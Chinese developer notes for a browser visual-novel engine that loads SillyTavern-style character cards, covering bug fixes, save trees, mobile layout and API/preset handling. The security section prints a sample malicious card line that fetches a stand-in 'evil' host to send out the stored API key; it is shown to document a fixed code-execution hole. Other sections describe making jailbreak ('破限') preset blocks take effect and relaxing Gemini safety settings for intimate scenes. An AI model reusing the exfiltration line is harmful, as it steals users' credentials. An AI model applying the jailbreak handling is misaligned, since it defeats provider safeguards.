| 界面上冒出 `**文字**` 或 `<b>` | 那几处是 `textContent` 赋值，HTML 标签和 Markdown 都不会被解析。要粗体就得用 `innerHTML` |
| 锁了皮肤，一点下一句又跳回去 | 一轮十几句的立绘是 `processOutput` 时**一次性全解析好**的。只刷新当前句没用，得把整条日志里**这个角色**的立绘重解析（`refreshSpritesFor`）。只刷这一个角色 —— 全量重刷会把别人的多图差分重新随机抽一次，「没说话的人也在动」就又回来了 |
| CG 闪一下就没 | 图只挂在一句上。要让它铺到被换掉为止（`nearestCG`），不是只在那一句显示 |
| 开关点了没反应 | `renderCGMode()` 当初用 `setTimeout(…,0)` 延迟调，初始 class 没同步，第一次点击视觉上没变化。脚本本来就在 body 末尾，直接调 |
| 舰娘之间的对话跑进指挥官私聊 | `[短信\|…]` 的收件人**永远是指挥官**，模型却拿它写舰娘互相说话。世界书写正反例 + 引擎 `peerDirected()` 改投群聊 |
| 「指挥官，早呀～」被误判成舰娘对话 | 第三人称检测看「出现了指挥官 + 通篇没有『你』」，但开头那个「指挥官」是**呼格**。要先放行以称呼开头的 |

| 预设的思维链整段漏进台词 | 只复制了预设的提示词块，没读 `preset.extensions.regex_scripts`。见七·十一 |
| 预设破限像没发一样 | `api.js` 把**所有** system 消息拎到最前合并，后置破限被压在几十轮历史底下 |
| 预设里满是 `{{getvar::xx}}` 原文 | 宏只认 4 个，`setvar/getvar/trim/注释/random` 全没展开 |
| Gemini 一到亲密戏就戛然而止 | 没发 `safetySettings`，默认阈值按 SAFETY 掐断 |
| Gemini 测试连接永远失败 | `endpoint()` 不管流不流式都用 `:streamGenerateContent?alt=sse`，非流式 `res.json()` 读 SSE 必炸 |
| 拉取模型「什么都没有」 | `<datalist>` 在输入框有字时只显示匹配项，手机上不弹。换成 `<select>` |
| 冒烟测试没测到新模块 | `smoke-test.js` 有**自己的** FILES 列表，不读 index.html。加新 core 文件两边都要登记 |

| 预设开关怎么改都像没改 | `prompt_order` 取了 [0]，那是 character_id 100000 的旧残留组，酒馆实际用 100001 |
| 火山方舟连不上 | `endpoint()` 只认 `/v1` 结尾，`/api/v3` 被拼成 `/api/v3/v1/chat/completions` |
| 最大输出被「调」到 400 | `compatFix` 从整条错误信息里找数字，第一行「HTTP 400」被当成了上限 |
| 剧本全是 `<背景|…>` 行被当成空回 | 判空时把所有 `<…>` 都剥了。只能剥空壳标签 |

| 「连 CG 图一起导」一点就报错 | app.js 里写的是 `global.Gallery` —— `global` 是 Node 的，浏览器里没有（第一行那个坑又踩了一次） |
| 存档界面在手机上糊成一团 | 又用了 `<aside>`，被那条裸选择器 `aside{position:absolute…}` 拽走了。**新布局一律用 div** |
| 重roll 后旧图挂到新句子上 | CG 按 log 下标挂图，出图十几秒里下标已经换了主人。改成认句子对象本身 |
| 顶部提示挡住存档界面的关闭按钮 | toast 在 top:14px、z-index 最高且可点。挪到 72px |

| 手机上小手机的返回键点不了 | 底部圆键在全面屏上压着系统手势条；横屏时机身按 393:852 的比例缩，被裁掉一半。手机模式铺满 + 返回键放顶上 |
| 手机上底部按钮被压到地址栏后面 | 用了 `100vh`。手机浏览器的 vh 算上了地址栏，要用 `100dvh` |
| 小屏上选项盖住正文 | 对话框高度按选项的 `offsetHeight` 算，那是已经被压扁的高度。用 `scrollHeight` |
| 主屏简报卡的字贴着边 | 又是 `#jup-root *{padding:0}`，按类写的 padding 被压成 0 |

| TG 类预设思维链照样漏 | 「思维链美化」的替换是 2600 字的 `<details>` 卡片，先按长度判成渲染器跳过了；兜底也不认识 `<draft_notes>`。折叠判断要在长度判断之前，思维链标签要从预设正则里学（`learnCotTags`） |
| 舞台上出现「旁白：w2g」 | 渲染器正则被跳过后，标签块原样进了剧本。`tidyRenderBlocks` 把它们改成选项或旁白 |
| `{{getvar::…}}` 原样发给模型 | 正则替换里的宏在预设块 setvar 之前就定型了。改成做标记（`_macro`），`build()` 里预设块之后再展开 |

**教训**：`tools/smoke-test.js` 用 jsdom 真跑 `index.html`，
上面一半的坑是它抓到的。改完先跑：

```bash
npm install jsdom
node tools/smoke-test.js 你的卡.json
```

浏览器控制台里 `__gal.eng` 可以直接看内部状态。

---

## 七·五、这个仓库里有什么、没有什么（v5.20 建库时定的）

### 只放引擎

`.gitignore` 挡掉了角色卡、预设、世界书，以及 `resource/juus/`、
`resource/tianqing/`、`docs/立绘清单.md` —— 后面这三样是
`tools/build-*.py` 从角色卡生成的派生数据，属于卡作者。
详见根目录 `NOTICE` 和 `resource/README.md`。

**后果与对策：**

| 少了什么 | 后果 | 怎么补上的 |
|---|---|---|
| 立绘/场景索引 | ~~舞台无图~~ | **载卡时从卡里直接读**（`core/cardres.js`，见七·六）。这才是正解，比「叫用户去跑 Python」好得多 |
| `resource/juus/phone.css` | 手机屏幕里的组件没样式 | 新写了 `app/phone-inner.css`，按引擎自己的浅色配色重做一份 |
| 素材表（测试要用） | smoke-test 跑不起来 | `tools/build-fixtures.mjs` 生成 `test/fixtures/resource.js`：结构照抄真表，URL 全是 `example.invalid` 占位，只留测试点名的十来个角色；手机帖子是手写的假内容 |
| 卡规模相关的断言 | 「通讯录七百多人」这类没法成立 | 加了 `okCard()`，没真表时**跳过**而不是假装通过。真表在场 307 项全跑，只有 fixture 时 299 项 + 4 项跳过 |

### 三份手机 CSS 的分工与加载顺序

```
app/phone-inner.css        组件外观（我们写的，浅色）   ← 打底
resource/juus/phone.css    卡自带的皮（可选，不在仓库）  ← 有就盖住上面
app/phone.css              机身 + 竖屏重排              ← 永远最后
```

顺序在 `index.html` 里是**有意排的**，别动：

- `app/phone.css` 必须最后，它把 `.split/.panel/.pbar/.pbody/.igbar/.igbody/.sub`
  一律 `position:static;display:block;background:none` 抹平，再按竖屏重排。
  排在它前面的任何布局都会被它接管 —— 所以 `phone-inner.css` 只写它**没**重置的那些。
- 卡自带的那份排中间，本地放了素材时外观就回到卡原来的样子。
- 顺手修掉了一个老问题：联系人名字原来是浅色写在浅色卡片上，几乎看不见
  （卡的 CSS 和 `app/phone.css` 都没给 `.cn` 设颜色）。`phone-inner.css` 补上了。

### 许可

引擎代码 MIT（`LICENSE`）。随仓库分发的第三方代码只有
`core/vendor/gpt-tokenizer-*.js`（npm 2.9.0，MIT）。
`core/vendor/larimar-preset.js` / `larimar-regex.js` 查下来**从未被加载过**
（`index.html` 里没有、代码里没引用，只有 `core/engine.js` 一行旧注释提到），
是死代码，已删除 —— 顺带解决了 Larimar 没有任何许可声明这个问题。


## 七·六、载卡时从卡里直接读素材（v5.20.1 补的一个缺陷）

### 缺陷本身

`engine.loadCard()` 原来只做三件事：读世界书、收正则脚本、装手机规则条目。
**它没读立绘。** 立绘/场景/默认立绘/手机资源全靠 `tools/build-juus.py`
**离线**抽成 `resource/juus/*.js`，由 `index.html` 用 `<script>` 静态加载。

于是：卡载进去了，`window.RESOURCE` 还是空的。没跑过那个 Python 脚本的人
（比如刚从 git 克隆下来的人）载完卡进游戏，舞台是空的，还以为坏了。

数据本来就在卡里。非要先跑一遍 Python 才能用，是我们自己的流程强加的，
不是必须的。`core/cardres.js` 把那四十行抽取逻辑搬到了运行时。

### 数据在卡的什么位置

| 内容 | 位置 | 变量 |
|---|---|---|
| 立绘 / 场景 / 默认立绘 | `data.extensions.regex_scripts[]` 里 scriptName 含「gal MVU」那条的 `replaceString` | `EXPRESSION_MAP` `SCENE_MAP` `DEFAULT_SPRITES` |
| 手机资源 | `data.extensions.tavern_helper.scripts[]` 里 name 为「juus小手机」那条的 `content` | `AVATARS` `STICKERS` `DEFAULT_AVATARS` `GROUP_META` `FACTION_MEMBERS` `BASE_POSTS` `BASE_TRENDS` |

**按名字找不到就按内容找**（`findSource()`）——
改过脚本名的分叉卡也认，因为变量名是代码里到处引用的，不会随便改。

### 三个不显然的地方

**一、截字面量时必须跳字符串。** 立绘 URL 里出现一个 `}`
（真卡里就有，catbox 的随机文件名会带）就足以把括号配平带歪，
截出来半截。`literalAfter()` 里跳过了字符串和注释。

**二、解析要三级降级。** 卡里那些字面量不是严格 JSON：有注释、裸键、
尾逗号、单引号，而且 `GROUP_META` 会**引用另一个变量** `FACTION_MEMBERS`。
所以：`JSON.parse` → 放宽后再 `JSON.parse` → `new Function` 求值。
第三级确实是在执行卡里的代码；之所以能接受，是因为引擎本来就会跑卡自带的
正则脚本，而且卡是用户自己从本机选的文件，信任级别一样。
介意就传 `{evalFallback:false}`，那样解析不了的条目直接丢掉。

**三、必须就地合并，不能替换对象。**
`core/resolver.js` 在加载时就抓住了引用：

```js
var R = global.RESOURCE = global.RESOURCE || { characters:{}, scenes:{}, defaults:{} };
```

`apply()` 要是写成 `global.RESOURCE = {...}`，resolver 手里还是旧对象，
新数据它一个都看不见。单测里有一条专门盯这个
（「没有替换 window.RESOURCE 对象本身」）。
场景还要**按地点**合并，不能整个覆盖 —— 否则卡里有「食堂(朝)」
就会把预置包里的「食堂(夜)」一起顶掉。

### 顺带修的：空 findRegex 会把整段正文糊掉

做端到端测试时踩到的。卡里常有「只是拿 `replaceString` 当代码仓库存着」
的条目 —— 它没有 `findRegex`。`collectRegex()` 原来照收，编成
`new RegExp('', 'g')`，这玩意在**每个字符缝隙**都匹配，于是那段代码被插得
满正文都是，剧本全废。现在空 findRegex 直接跳过。

这个坑之前没暴露是因为真卡的那几条都恰好有 findRegex，
是我为测试临时造的合成卡把它顶出来了 —— **合成数据的价值之一就在这**。

### 怎么验

`tools/e2e-card.mjs`：真浏览器（Playwright）打开 `index.html`，
把合成卡喂进开场引导的文件框，翻两页，看舞台上到底有没有立绘和背景。
合成卡里的图都是 data: URI 的纯色方块，离线也能渲染。

```bash
mv resource/juus /tmp/ && node tools/e2e-card.mjs . /tmp/shots
```

playwright 不在默认依赖里，这个测试是可选的。
`tools/smoke-test.js` 的 [6w2] 段用 jsdom 覆盖了同样的逻辑，那个是必跑的。


## 七·七、原皮 / 退出 / 多周目存档（v5.20.2）

玩家反馈「除了有差分的舰娘，其余的没用原皮，直接裂图了」。查下来是**两个**
互相独立的缺陷叠在一起，外加翻出两个存档相关的 bug。

### 裂图：两个成因，缺一不可

**一、默认在随机抽皮肤。** `cfg.randomSkin` 原来默认 `true`，
`ensureSkin()` 对只有默认立绘的角色做 `Math.random() * a.length`，
从**全部皮肤里随机抽一张**。卡里那几千个换装 URL 挂在第三方图床上，
死链不少，随机抽经常抽到挂掉的那几张 —— 而且玩家本来期待看到的就是原皮。
改成默认 `0`（原皮），想随机的去 `设置 · 外观 · 只有默认立绘的角色随机换皮肤`。
**别把这个默认改回 true。**

**二、`swap()` 把保护性的 onerror 覆盖掉了。** `makeChar()` 里给每个 `<img>`
挂了「挂了就隐藏这一层」的处理器，但 `swap()` 换图时会重设 `img.onerror`，
把它顶掉，之后死链就直接裂在舞台上。现在 `swap()` 自己管全套：

```
主图挂 → 退到原皮（urls[0]） → 原皮也挂 → 隐藏整层 + 记进 imgFails
```

顺带修了一个隐蔽的：缓存命中时 `onload` 不会再触发，原来只判 `img.complete`
就当成功了 —— 但**加载失败的图 `complete` 也是 true**，得再看 `naturalWidth > 0`。

### 存档：autosave 固定写死一个槽

`autosave()` 永远写 `'auto'`。开第二个开局，第一个的进度就被静默覆盖 ——
「玩一个开局，存了去玩别的，回头再接着玩」这个需求直接踩雷。
改成每次「开始游戏」生成一个 `runId`，自动存档写 `auto:<runId>`。
`restoreFrom()` 会把 runId 一并恢复，所以接着玩是存回同一个槽，不会越存越多。
老版本留下的那个全局 `'auto'` 仍然读得到（runId 为空时就继续写它）。

### 「继续上次」会丢进度

`btn-continue` 只恢复了 `history` 和 `vars`，**没恢复 `log` / `cursor` /
`phoneSent` / `phoneSeq`** —— 读档后整条剧情记录是空的、手机消息也没了，
只能从空白继续。存档面板里那条路径是完整的，等于同一件事写了两份，
其中一份写残了。现在统一走 `restoreFrom(sv, id)`，只此一份。

### 退出按钮

工具栏第一个 `⏻`：先把当前周目存好，再清舞台、回开场引导。
引导页左栏新增周目列表（`#boot-runs`），每条显示开局名 / 地点 / 天数 /
轮数 / 时间 / 自动还是手动，点一下续上。`#btn-continue` 保留，
续的是最近那一份（槽名放在 `dataset.slot`）。

### 怎么验

`tools/e2e-saves.mjs` 真浏览器跑完整流程：
开 A → 看立绘是不是原皮（主图故意给死链）→ 退出 → 开 B →
确认两份存档在不同槽里 → 点回 A → 确认剧情记录和光标都完整。18 项。

```bash
node tools/e2e-saves.mjs . /tmp/shots
```


## 七·八、一次系统自查修掉的五条（v5.20.3）

配合天青和开拓两个参考库做了一轮自查。下面五条**每条都实测复现过**，
不是代码审读推断出来的。前三条是我们自己新写的代码引入的。

### ① 安全：载入角色卡等于执行卡里的任意 JS（最严重）

`core/cardres.js` 原来有「JSON.parse → 放宽后再 parse → `new Function` 求值」
三级降级。只要卡里那段字面量不是合法 JSON，前两级必然失败，落到第三级。
实测这张卡：

```js
var EXPRESSION_MAP = { "柴郡": (fetch('https://evil/?k='
                      + localStorage.getItem('gal_api_config')),
                      { "常服": { "微笑": "u.png" } }) };
```

立绘照常抽出来、界面毫无异样，同时 `{"apiKey":"sk-…"}` 被原样送走。
还能用死循环把页面永久卡死（`try/catch` 拦不住）。角色卡是从网上下载、
互相传的文件。

当初写的辩解是「引擎本来就跑卡自带的正则，信任级别一样」—— **错的**。
正则只做字符串替换，从不执行代码，这两者差一整个量级。

现在换成自写的 `LiteralParser`：递归下降，只认对象/数组/字符串/数字/
布尔/null，以及「在已解析的依赖上取值」这一种受控形式（`GROUP_META`
引用 `FACTION_MEMBERS` 靠它）。见到 `(` 一律报错。**这条是安全边界，
以后别以任何理由放宽。** 冒烟测试 [6w5] 里有端到端断言：载入一张带
副作用的卡，副作用不能发生。

### ② `swap()` 并发：1.5 秒内换两次立绘，画面翻回旧图

两次 `swap` 操作**同一个 `<img>`**，后一次把前一次的 `onload` 覆盖掉，
于是前一次永远 settle 不了，它那个 1500ms 兜底定时器照常到点，把旧立绘
重新推回前台；而 `rec.url` 已经是新图，`applyStage` 不会再换，画面就一直
错着。实测：换图后 1.7 秒前台从 B 翻回了 A。快速点「下一句」就能触发。

讽刺的是这正是七·七修的那类 bug（处理器被覆盖），只不过这次是 `swap`
覆盖它自己。修法是加 `rec.swapToken`，后来者让前面的作废。
**注意作废时也要 `resolve`**（`giveUp()`）—— `applyStage` 是
`Promise.all(jobs)`，漏一个不 resolve 就整体挂住。

### ③ 设置页全线贴边（同一个坑踩了两次）

`#jup-root *{padding:0}` 是 ID 特异性 (1,0,0)，`.kt-*` 这些 (0,1,0) 一律
压不过。第一次只给 `.kt-nav` 提了权就以为修好了，其实正文 `.kt-pane-bd.pad`、
所有 `.kt-btn`、所有输入框和表格**全是 0** —— 真浏览器量出来 `padding: 0px`，
截图里标题、标签、输入框、保存按钮全贴在左边缘。

现在的规矩：**`app/editor-theme.css` 里凡是带 padding 的 `.kt` 规则，
选择器一律同时写 `#jup-root ` 前缀版和原版**（36 条已批量改写）。
冒烟测试会扫这个文件，漏一条就报错。

### ④ 手机消息和剧情短信不在一个坐标系

剧情里的 `[短信|…]` 用 `turn` = **history 数组下标**（几十上百），
手机侧消息用 `++phoneSeq`（从 1 开始）。两套编号混在一起排序，
手机侧永远排在剧情侧前面。实测第 40 轮她发来「晚上有空吗」(turn=39)，
你回的「有空啊」(turn=1) 排在她**前面**。

改成同一坐标系：整数部分 = 当前 history 长度，小数部分 = 递增 seq。
顺带修了 `btn-start` 清 `phoneSent` 却不清 `phoneSeq`。
（老存档里的手机消息 turn 还是小整数，顺序仍会偏，只影响已有存档。）

### ⑤ 额外导入的世界书 uid 和卡内条目撞车

`worldbook.js` 的 `uid: e.id != null ? e.id : i` —— ST 导出的 World Info
条目只有 `uid` 字段没有 `id`，于是全部退化成数组下标。实测 uid 变成
`0,1,__engine_*,0,1`。`findEntry(1)` 永远命中卡内那条：在世界书 App 里
点导入的条目、改它的开关，操作全打到卡里另一条上。Vector 索引也按 uid
存，同样互相覆盖。现在 `addWorldbook` 每次导入给一个 `wiN:` 前缀。


## 七·九、四条小修（v5.20.4）

都是「成本很低但玩家每天都会撞上」那一类，参考了开拓的 CHANGELOG。

### ① 全局错误兜底（`core/crash.js`）

以前全仓一个 `window.onerror` / `unhandledrejection` 都没有。这是个无框架
单页应用，渲染路径（`play` / `renderPhone` / `syncCG` / `present`）抛了就
断在那儿 —— 玩家看到的是「点了没反应」，`busy` 还可能永远卡在 true，
而错误只进了控制台，玩家不会去开 F12。

现在接住两类事件，弹一个兜底页，把 message 和 stack **原样摊出来**
（报 bug 直接截图）。四颗按钮里**「导出存档备份」排第一** —— 崩溃时
玩家最怕的是进度没了，这比「刷新」更重要。

三个要点：
- `crash.js` 必须是 `index.html` 里**第一个**脚本，它要能接住后面任何
  一个脚本的语法错误和初始化异常；它自己不依赖任何其它模块。
- 导出走**原生 indexedDB**，不走 `GalStore` —— 崩溃时它可能就是坏的那个。
  全程 try/catch + 3 秒超时，读不到就只导 localStorage 那部分。
  键名带 key/token/secret 的一律不导出。
- **死链图片不能弹兜底页**。`error` 事件会冒泡到 window，而立绘死链是常态
  （`swap()` 自己处理了）。所以 `e.target !== window` 且是 `<img>` 的直接忽略，
  只有 `<script>` 加载失败才报。

### ② 中文输入法选词误发送

三处 `keydown`（主输入框、手机聊天框、评论框）都只判了 `e.key === 'Enter'`。
用拼音打「你好」、空格选词、回车确认 —— **直接把半截内容发出去了**。
加了 `composing(e)`：`e.isComposing || e.keyCode === 229`（后者是旧浏览器
和部分安卓输入法在组合态下统一上报的值）。

### ③ 发送失败后输入的文字没了

`submit()` 在**发请求之前**就 `input.value = ''`，`catch` 里不还原。
写了两百字，网络一抖或点了中断，全没。现在 catch 里还回去 ——
但只在输入框还空着时还原，免得盖掉这段时间里新写的东西。

### ④ 429 不在重试范围里

`isTransient()` 的正则里**没有 429**，而 `readError()` 明明认出了限流、
还提示「等一会儿再试」—— 认出来了却不重试，把等待推给玩家手动做。
免费档 NAI 和便宜中转最常见的失败就是 429。

改了四处：
- `readError()` 把 `status` 和 `retryAfterMs` 挂到 Error 对象上（以前只有
  一段人读的文案）。`Retry-After` 秒数和 HTTP 日期两种格式都认。
- 新增 `isFatal()`：400/401/403/404/422 和「没填密钥」这类**显式排除**，
  以前它们是靠正则不匹配来侥幸躲过重试的。
- 退避改成 `backoffMs()`：有 `Retry-After` 就听服务端的，否则 1s/3s/9s，
  **封顶 60 秒**（服务端偶尔给几十分钟，不封顶界面就卡死了）。
- `core/imagegen.js` 同样处理，并且**被中断时立刻收手** —— 以前点了「停」
  还会先 `sleep(1000)` 再发一个注定失败的请求。


## 七·十、存档导出 / 导入（v5.20.5）

玩家问「数据存浏览器吗？感觉很容易被清，有没有本地备份」—— 问到点子上了，
当时**确实没有**：世界书能导出、预设能导出，唯独存档不能，面板里只有
读取/改名/删除。唯一的导出入口在崩溃兜底页里，等于**崩了才能备份**。

### 数据到底在哪、什么时候会没

存档在浏览器的 IndexedDB（`GalStore`，三级降级 IndexedDB → localStorage → 内存）。
会丢的情形，按常见程度：

1. **清浏览器缓存 / 站点数据** —— 直接没
2. **换浏览器、换设备** —— 各存各的，不同步
3. **`file://` 打开的本地文件 和 `https://` 的网址是两个不同的源** ——
   存档互不相通。这条最容易被误会成「数据丢了」，其实是在另一个源里躺着
4. 无痕窗口 —— 关掉即没
5. IndexedDB 写失败降级到内存 —— 刷新即没（`backendNote()` 会提示）

### 做了什么

`设置 · 存读档` 顶部加了工具条：**导出全部** / **导入备份** / 「连 CG 图一起导」
勾选框；每条存档右边加了单独的**导出**。

三个设计决定：

- **导出前先 `saveSlot(autoSlotId(), snapshot())`。** 自动存档只在「生成完一轮」
  时触发，玩家翻了几页再点导出的话，不先落盘就会把**旧位置**导出去。
  这是端到端测试抓出来的：翻到第 2 句导出，读回来停在第 1 句。
- **导入是合并、重名另存副本，绝不覆盖。** 手一抖把正在玩的那局盖掉太亏。
  重名的存成 `原名(导入2)`。
- **CG 图默认不打包。** 图是 dataURL，一张 1~2MB，几十张就上百兆。
  勾选框给需要的人，`Gallery.put()` 收的是完整记录对象，导入时把 meta
  原样还回去并**保持 id 不变**（存档里挂的就是那个 id）。

导出的包不含 API 密钥 —— `snapshot()` 里本来就没有，测试里有断言盯着。

### 怎么验

`tools/e2e-backup.mjs`：真浏览器走一遍玩家会做的事 ——
玩一局 → 点导出拿到 JSON → **把 IndexedDB 和 localStorage 整个清掉** →
刷新确认一份存档都没有 → 导入那个 JSON → 存档回来 → 读取 → 剧情记录完整 →
再导一次确认重名不覆盖。18 项。

⚠ 这个测试**必须跑在 http 源上**（脚本里用 `p.route()` 起了个假的
`http://gal.test`）。`file://` 下 Chromium 不给 IndexedDB，测出来的是内存降级
路径，验不到真实行为。


## 七·十一、预设正则 / 预设生效 / 测试连接（v5.21）

用户反馈三件事：预设会「爆思维链」；预设没效果，正常的成人感情戏也截断；测试连接没用、拿不到模型列表。

### 正则：`core/regex.js`

- 来源三处：卡（`card.data.extensions.regex_scripts`）、预设（`preset.extensions.regex_scripts`，
  也认顶层 `regex_scripts`）、玩家单独导入（localStorage `gal_user_regex`）。手动开关存 `gal_regex_off`。
- 语义照酒馆：不勾 markdownOnly/promptOnly = 直接改写；markdownOnly = 只显示；promptOnly = 只提示词（带深度筛选）。
- **显示**：`processOutput` 在老的卡正则之后跑 预设 + 导入 的正则。卡的显示正则**仍走老路径**
  （`collectRegex`，不看 placement/flags），没有 juus 卡没法回归验证，没敢动。
- **提示词**：`Engine.promptHistory()` 给历史的每条算深度（0 = 最新），跑卡 + 预设 + 导入里 promptOnly 和不带标记的。
  存档原文不动。
- 替换成 `<details>` 的当隐藏；替换成其它 HTML 的只在提示词里生效（舞台不渲染 HTML，塞进去会混进剧本行）。
- `stripReasoning()` 是不靠预设的兜底，`processOutput` 第一步就跑 —— 必须早于手机标签和变量更新的认领，
  因为推理里常照抄格式示例。`turn()` 存进 history 的也是剥过的版本。

### 预设为什么「没效果」

见 README v5.21。要点：`api.js` 的 `arrange()` —— 开头连续的 system 才进系统提示词，之后的原地改 user
（OpenAI 协议可设 `cfg.midSystem = 'system'` 保留角色，目前没有界面）；`prompt.js` 的 `macros()` 覆盖了酒馆常用宏，
预设块在组装前**按 prompt_order 顺序**先求值，setvar/getvar 才能前后呼应，局部变量挂在 `eng.macroVars`（跨轮，但不进存档）；
`assistant_prefill` 只在 Anthropic 协议发。

### 停止原因

`GalAPI.lastFinish = { reason, info }`，`explainFinish()` 分三类：length / filter / other。
界面在每轮结束时 `warnAfterTurn()` 弹 toast。空回复 + filter 直接抛 `fatal` 错误，不白白重试。

### 测试连接

`GalAPI.probe()`：先 `listModels()`（不需要模型名），再用选中的模型真发一句。任何一步失败都不抛，结果里写原因。
`modelsUrl()` 会剥掉用户填的 `/chat/completions`、`/messages` 尾巴，`/api/v3` 这类自带版本号的不再补 `/v1`。

### 怎么验

```bash
node tools/unit/test-preset.mjs     # 71 项
node tools/smoke-test.js            # [7b] 测试连接拉模型、[7c] 预设正则
```

没有用户那份预设和中转，**真实端到端没跑过**。最该实测的：用那份预设跑一轮，看调试面板「上次请求」里
破限块是不是在历史之后、有没有残留的 `{{...}}`；「模型原文」和舞台对比，看思维链有没有被剥干净。

## 七·十二、对照 KaiTuoYiShi 补的一批（v5.21）

用户让拿 KaiTuoYiShi（2026-09-12，2d5760b）对比预设、正则、测试连接、破限。逐项结论见 README v5.21「对照开拓轶事」那张表。
几个实现上要知道的：

- **prompt_order 取组**：`PromptBuilder.orderOf()`。编辑器（`core/editors.js`）的开关、排序也走它，改的是同一组。
- **宏求值**：`evalMacros()` 是顺序扫描器，不再用正则一层层替换。`{{if}}` 的条件和被选中的分支才求值；
  不认识的宏原样保留（里面嵌的宏先求了值）。`{{trim}}` 用 \u0001 占位，最后连两侧空白一起删。
- **正则位置表**：`regex.js` 的 `PRESET_PATHS`。导入框拖整份预设 / 角色卡也能抠出正则。
- **参数降级**：`api.js` 的 `compatFix()` 看 400/422 的错误文案决定降级，结果按「协议 | 地址 | 模型」存在 `COMPAT` 里
  （只在内存，刷新页面重来一遍，代价是多一个 400）。认不出的 400 照常抛，**不要**把它改成无脑重试。
  注意数字要从错误正文里找 —— 第一行是我们自己拼的「HTTP 400」，以前把 400 当成了上限。
- **DeepSeek 前缀续写**：只在官方域名（deepseek.com）且有预填时切 `/beta` 并带 `prefix:true`；被拒会退回原地址。
- **空回重试**：`Engine.isEmptyReply()` 只剥「空壳标签」`<content></content>`，`<背景|港区>` 这种剧本行不能当空。
  `GalAPI.lastFinish` 是 length 时不重试（写思维链写到上限，重来还是一样）。
- **对话地址**：`/api/v3`、`/beta` 这类已带版本段的，`endpoint()` 不再补 `/v1`。原来火山方舟会拼成 `/api/v3/v1/chat/completions`。

测试：`tools/unit/test-kt-parity.mjs`（58 项），冒烟 [7b] 加了校验码、后处理选项，[7c] 加了正则试跑。

## 七·十三、重roll / 撤回 / 存档树（v5.21）

### 回合快照（app.js「回合快照」一节）

- `beginTurn()` 在发请求前记：`histLen`、`turnNo`（这一轮在 log 里的轮次号）、`vars`、`macroVars`、光标、出发节点 `node`。
- `recordVariant()` 生成完把这一版记下：`raw`、`mods`（**就是 log 里那几个对象本身**，CG 晚到挂上去版本里也有）、`varsAfter`。
- `revertTurn()` 撤一轮：历史里**按内容**找这一轮那对 user/assistant 摘掉（不能直接截断 —— 之后手机群聊可能又加了
  `phoneOnly` 记录）；log 按 `turn >= turnNo` 摘；变量恢复；`CG.cancel()`。
- `applyVariant()` 切版本：撤掉再把那一版的 `mods` 用 `appendLog(mods, {turn})` 放回去，不重新解析、不发请求。
- 快照栈 `turnStack` 内存里留 8 层，存档里带 3 层（`stackForSave`），读档后还能重roll。
- 重roll 失败会 `applyVariant(snap, snap.vi)` 放回原版本。
- `core/cg.js`：出图前记住那一句对象，挂图时 `eng.log[i] !== target` 就不挂（发 `stale` 事件）。
  以前是按下标挂，重roll 之后同一下标已经是别的句子了。

### 存档树（core/savetree.js + app.js「存档树」「存读档界面」两节）

- 槽位：`node:<nodeId>` 是节点（`type: auto|manual`，`tree: {rootId, nodeId, parentNodeId}`）；
  `auto:<runId>` 仍是「最新进度」指针（`type: latest`，`node` 记着当时站在哪个节点）；老版本的手动槽按 runId 归树。
- `activeNode` 是现在所在节点。`checkpoint()` 每轮建 / 更新这一轮的节点（重roll、换版本写回同一个 `turnNode`）。
  读档 = 站到那个节点上；接着玩的新节点挂在它下面，于是分叉。
- 读的是**旧节点**时，快照栈里的 `turnNode` 清空 —— 重roll 出的新版本另起一个节点当分支，
  不去改写旧节点（它下面可能已经长着后来的剧情）。
- 点读「最新进度」指针所站的那个节点时，实际读指针那份（内容一样，还带着之后翻到哪一句）。
- 裁剪：`SaveTree.planPrune()` 每棵树留 8 个自动节点；手动、导入、当前节点及其父节点不删；
  被删节点的子节点改挂到最近的留存祖先上。删单个节点也一样改挂。
- 目录索引：`GalStore.saveSlot()` 同时写 `savemeta:<id>`（`SaveTree.summarize()` 的结果），`listSaves()` 只读目录；
  没有目录的老存档第一次列表时补上。
- 只有 `GalStore.backend() === 'idb'` 才存节点（`treeOn()`），降级到 localStorage 时和以前一样只有指针 + 手动。

### 验

`tools/unit/test-savetree.mjs`（25 项）、冒烟 [7d]、`tools/e2e-reroll.mjs`（31 项，真浏览器 + 假接口）。
`e2e-saves` / `e2e-backup` 跟着改了：每个开局多一个「开场」根节点；手机里的存读档只剩「打开存档」按钮。

## 七·十四、手机适配（v5.22）

- **模式类**在 `<html>` 上：`m-pc` / `m-mobile m-port` / `m-mobile m-land`。`index.html` 的 `<head>` 里有一段内联脚本在
  第一帧前就加上（不加的话手机上会先闪一下电脑版），`app.js` 的 `applyDeviceClasses()` 是同一套逻辑，转屏 / resize 时重算。
  选择存 `localStorage.gal_device`（auto / pc / mobile）。自动 = `(pointer:coarse)` 且屏幕短边 ≤ 820。
- **样式**全在 `app/mobile.css`，每条都以 `html.m-mobile` 开头，最后加载。电脑模式不受任何影响 —— 改手机版式时别往
  `style.css` 里写，那边是电脑的。小手机里的规则必须带 `#jup-root`（`phone-inner.css` 的 `#jup-root *{padding:0}`）。
- **竖屏单人**不是改引擎的 `maxStage`（那是解析时定死的，转屏就不对了），而是渲染时 `stageFor(m)` 过滤：
  说话的人 → 旁白时刚才那个人 → 第一个。`onLayoutChange()` 在切设备 / 转屏时按新规则重摆当前这句。
- **小手机**：手机模式下去掉机身、铺满，`#ph-m-back`（`phoneBack()`：在主屏就收起，否则 `goHome()` 逐级返回）
  和 `#ph-m-close` 常驻顶上；底部 `.ph-homebar` 隐藏。
- **对话框高度** `refreshDlgHeight()`：上限按模式（电脑 72%，竖屏 50/62%，横屏 56/70%，斜杠后是有选项时）。
  选项高度要用 `scrollHeight`。
- 测试：`tools/e2e-mobile.mjs`（v5.22 时 144 项），冒烟 [7e]。想看样子可以跑它，截图在第二个参数指定的目录。

## 七·十五、手动横竖屏 / 工具栏收起（v5.23）

- **方向设置** `localStorage.gal_orient`：auto（跟随手机）/ port / land。`applyDeviceClasses()` 里：
  想要的方向 = 设置（auto 时 = 实际方向）；和实际方向不一样就加 `m-rot`，再加 `m-rot-cw`（竖着拿画横屏）或
  `m-rot-ccw`（横着拿画竖屏），并在 `<html>` 上写 `--rw` / `--rh` = innerHeight / innerWidth。`index.html` 头部内联脚本同一套逻辑。
- **怎么转**（`mobile.css` 最后一节）：`body` 设成 `position:fixed`、宽 `--rw` 高 `--rh`，`transform-origin:0 0`，
  cw 是 `translateX(--rh) rotate(90deg)`，ccw 是 `translateY(--rw) rotate(-90deg)`。`fixed` 的弹层以 transform 过的 body
  为包含块，跟着一起转。点击 / 滚动浏览器自己会换算，不用管坐标。
